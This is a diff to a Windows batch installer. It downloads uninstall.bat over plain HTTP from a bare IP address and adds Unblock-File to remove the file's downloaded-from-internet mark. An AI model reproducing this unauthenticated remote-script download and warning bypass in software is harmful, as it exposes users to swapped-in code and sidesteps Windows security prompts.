@@ -64,7 +64,7 @@ if not exist "%~dp0src\lib\" (
 :: ── Download uninstaller ───────────────────────────────────────────────────────
 if not exist "%~dp0uninstall.bat" (
     powershell -NoProfile -Command ^
-        "try { Invoke-WebRequest 'http://46.101.184.78:8766/uninstall' -OutFile '%~dp0uninstall.bat' -UseBasicParsing } catch { Write-Host 'Could not download uninstaller.' }"
+        "try { Invoke-WebRequest 'http://46.101.184.78:8766/uninstall' -OutFile '%~dp0uninstall.bat' -UseBasicParsing; Unblock-File '%~dp0uninstall.bat' } catch { Write-Host 'Could not download uninstaller.' }"
 )
 
 :: ── Download launcher from server ─────────────────────────────────────────────
